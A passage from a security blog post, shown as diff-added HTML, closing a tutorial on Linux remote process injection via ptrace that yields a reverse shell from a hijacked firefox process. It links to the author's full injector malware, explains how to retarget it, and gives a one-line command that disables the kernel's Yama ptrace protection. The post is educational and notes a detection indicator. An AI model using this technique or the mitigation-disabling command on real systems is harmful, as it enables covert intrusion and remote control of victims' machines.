+  <figure>
+    <img class="my-0 rounded-md" src="https://i.imgur.com/JlSK1Bp.png" alt="Malware Injector" />
+    
+  </figure>
+
+</p>
+<p>The following is the task-manager screenshot on Kali Linux showing an <code>sh</code> process as a child process of the above <code>firefox</code> process. This is similar to the common <code>cmd.exe</code> as a child process of an unsual process in Windows mainly an <code>IOC</code> for Remote Process Injection.</p>
+<p>
+
+
+
+
+  <figure>
+    <img class="my-0 rounded-md" src="https://i.imgur.com/EU2mEiu.png" alt="Task Manager" />
+    
+  </figure>
+
+</p>
+<p>The following show as successful connection to our listening port.</p>
+<p>
+
+
+
+
+  <figure>
+    <img class="my-0 rounded-md" src="https://i.imgur.com/9qYboUS.png" alt="Connect Back" />
+    
+  </figure>
+
+</p>
+<p>The complete code injection malware can be found <a href="https://github.com/mutur4/Linux-Malware/blob/main/Process.Injection/code_process_injector.c"   target="_blank">
+    here</a>. The <code>strstr</code> function inside the <code>EnumProcess</code> function can be modified to inject into a specific process or it can be commented out for injection into a random process.</p>
+<p>One of the major caveat&rsquo;s about <code>ptrace</code> is that there is a protection/mitigation where the Kernel is configured to prevent any process from calling <code>ptrace</code> on another process that it did not create via <code>fork</code>.If this feature is enabled the above process injector will not work. This can be temporarily disabled until the next boot using the following command.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="m">0</span> <span class="p">|</span> sudo tee /proc/sys/kernel/yama/ptrace_scope
+</span></span></code></pre></div><div id="conclusion" class="anchor"></div>
+<h2 class="relative group">Conclusion 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#conclusion" aria-label="Anchor">#</a></span>        
+    
+</h2>
+<p>This was a Linux Process Injection technique that was aimed at emulating the Windows <code>CreateRemoteThread</code> and <code>VirtualAllocEx</code> injection process.</p>
+<div id="references" class="anchor"></div>
+<h2 class="relative group">References 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#references" aria-label="Anchor">#</a></span>        
+    
+</h2>
+<ul>
+<li>[1] <a href="https://github.com/gaffe23/linux-inject"   target="_blank">
+    https://github.com/gaffe23/linux-inject</a></li>
+<li>[2] <a href="https://blog.xpnsec.com/linux-process-injection-aka-injecting-into-sshd-for-fun/"   target="_blank">
+    https://blog.xpnsec.com/linux-process-injection-aka-injecting-into-sshd-for-fun/</a></li>
+</ul>
+
+    </div>
+    <script>
+      var oid = "views_posts\/remote-process-injection\/_index.md"
+      var oid_likes = "likes_posts\/remote-process-injection\/_index.md"
+    </script>
+    
+    
+    <script type="text/javascript" src="/js/page.min.0e49973b4ad0a382c7c6012d8bff8226316642daabc4f8a20477bd08674f3da6e2fa993bc20ad4f51e7c5bb68e6f913a207a7c4fe37ea0e7b806894afce0a64e.js" integrity="sha512-DkmXO0rQo4LHxgEti/&#43;CJjFmQtqrxPiiBHe9CGdPPabi&#43;pk7wgrU9R58W7aOb5E6IHp8T&#43;N&#43;oOe4BolK/OCmTg=="></script>
+  </section>
+  
+  <section class="mt-10 prose dark:prose-invert">
+    <p class="py-8 border-t">
+      <em>There's no articles to list here yet.</em>
+    </p>
+  </section>
+  
+
+    
+
+  
+      <div class="pointer-events-none absolute top-[100vh] bottom-0 w-12 ltr:right-0 rtl:left-0">
+  <a href="#the-top"
+    class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 mb-16 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 backdrop-blur hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+    aria-label="Scroll to top" title="Scroll to top">
+    &uarr;
+  </a>
+</div>
+    </main><footer class="py-10 print:hidden">
+  
+  
+    
+    <nav class="flex flex-row pb-4 text-base font-medium text-neutral-500 dark:text-neutral-400">
+      <ul class="flex flex-col list-none sm:flex-row">
+        
+        <li class="flex mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0">
+          <a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2" href="/tags/"
+            title="Tags">Tags</a>
+        </li>
+        
+      </ul>
+    </nav>
+    
+  
+  <div class="flex items-center justify-between">
+
+    
+    
+    <p class="text-sm text-neutral-500 dark:text-neutral-400">
+      &copy;
+      2023
+      BinaryChunk
+    </p>
+    
+
+    
+    
+    <p class="text-xs text-neutral-500 dark:text-neutral-400">
+      
+      
+      Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+        href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+        href="https://blowfish.page/" target="_blank" rel="noopener noreferrer">Blowfish</a>
+    </p>
+    
+
+  </div>
+  <script>
+    
+    mediumZoom(document.querySelectorAll("img:not(.nozoom)"), {
+      margin: 24,
+      background: 'rgba(0,0,0,0.5)',
+      scrollOffset: 0,
+    })
+    
+  </script>
+  
+  
+  <script type="text/javascript" src="/js/process.min.611c2f100351230a9f8fc00f14b270e9496cc3730da5a6d76742ce62982fe905bce336819ddb93eb75a002b363b7847f3a8d4d3a6feaf79861feb2c889ffae87.js" integrity="sha512-YRwvEANRIwqfj8APFLJw6Ulsw3MNpabXZ0LOYpgv6QW84zaBnduT63WgArNjt4R/Oo1NOm/q95hh/rLIif&#43;uhw=="></script>
+  
+  
+</footer><div
+  id="search-wrapper"
+  class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh]"
+  data-url="https://mutur4.github.io/"
+  style="z-index:500"
+>
+  <div
+    id="search-modal"
+    class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800"
+  >
+    <header class="relative z-10 flex items-center justify-between flex-none px-2">
+      <form class="flex items-center flex-auto min-w-0">
+        <div class="flex items-center justify-center w-8 h-8 text-neutral-400">
+          
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+        </div>
+        <input
+          type="search"
+          id="search-query"
+          class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent"
+          placeholder="Search"
+          tabindex="0"
+        />
+      </form>
+      <button
+        id="close-search-button"
+        class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+        title="Close (Esc)"
+      >
+        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+
+  </span>
+
+
+      </button>
+    </header>
+    <section class="flex-auto px-2 overflow-auto">
+      <ul id="search-results">
+        
+      </ul>
+    </section>
+  </div>
+</div>
+
+  </div>
+</body>
+
+<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js"
+  data-id="https://buymeacoffee.com/binarychunk" data-description="Support me on Buy me a coffee!" data-message=""
+  data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script>
+
+</html>
